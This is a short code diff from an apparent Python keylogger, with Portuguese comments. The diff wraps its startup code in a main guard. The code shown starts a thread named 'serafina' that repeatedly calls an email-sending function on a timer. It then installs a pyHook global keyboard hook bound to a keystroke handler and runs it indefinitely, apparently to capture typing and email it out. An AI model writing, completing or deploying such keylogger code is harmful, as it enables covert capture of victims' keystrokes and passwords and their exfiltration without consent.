@@ -87,15 +87,16 @@ def serafina():
 		enviar_email(conf)
 		sleep(conf['time_sleep']) # tempo em segundos
 
-# inicia a thread para enviar email de (conf.time_sleep) em (conf.time_sleep) tempo
-th = Thread(target=serafina)
-th.start()
+if __name__ == '__main__':
+	
+	# inicia a thread para enviar email de (conf.time_sleep) em (conf.time_sleep) tempo
+	th = Thread(target=serafina)
+	th.start()
 
-# cria e gerencia gerenciador de hook
-kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+	# cria e gerencia gerenciador de hook
+	kl = pyHook.HookManager()
+	kl.KeyDown = KeyStroke
 
-# registra e executa indefinidamente
-kl.HookKeyboard()
-pythoncom.PumpMessages()
-
+	# registra e executa indefinidamente
+	kl.HookKeyboard()
+	pythoncom.PumpMessages()
